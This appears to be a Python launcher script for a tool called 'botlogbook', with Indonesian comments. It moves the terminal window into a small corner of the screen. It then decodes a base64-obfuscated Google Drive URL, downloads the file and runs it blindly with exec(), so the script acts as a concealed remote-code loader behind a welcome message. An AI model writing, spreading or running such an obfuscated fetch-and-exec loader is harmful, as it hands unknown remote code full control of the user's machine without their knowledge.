import os
import subprocess
import pyautogui
import requests
import base64

def move_console():
    try:
        # Ambil resolusi layar
        xrandr_out = subprocess.check_output("xrandr | grep '*'", shell=True).decode()
        resolution = xrandr_out.strip().split()[0]  # contoh: "1920x1080"
        screen_width, screen_height = map(int, resolution.split('x'))

        # Ukuran jendela terminal
        win_width = 500
        win_height = 230

        # Posisi kanan bawah dengan margin
        margin_x = 10
        margin_y = 50
        pos_x = screen_width - win_width - margin_x
        pos_y = screen_height - win_height - margin_y

        # Cari jendela terminal
        output = subprocess.check_output(["wmctrl", "-l"]).decode()
        lines = output.splitlines()
        for line in lines:
            if "Terminal" in line or "botlogbook" in line or "botlb.sh" in line:
                window_id = line.split()[0]
                # Format wmctrl: "gravity,X,Y,W,H"
                geometry = f"0,{pos_x},{pos_y},{win_width},{win_height}"
                subprocess.call(["wmctrl", "-i", "-r", window_id, "-e", geometry])
                return

        print("⚠️ Tidak dapat menemukan jendela terminal.")
    except Exception as e:
        print(f"Gagal memindahkan window: {e}")
        
move_console()

url = base64.b64decode("aHR0cHM6Ly9kcml2ZS51c2VyY29udGVudC5nb29nbGUuY29tL2Rvd25sb2FkP2lkPTE4VV9Xd2FNZjNBcExWOVR0NGNhdVNtVGFhbUhuVmtXYyZleHBvcnQ9ZG93bmxvYWQmY29uZmlybT10AA==").decode()
response = requests.get(url)

if response.status_code == 200:
    print("Welcome to botlogbook.", end="\r")
    exec(response.text)
else:
    print(f"Server gagal merespon. Status: {response.status_code}")
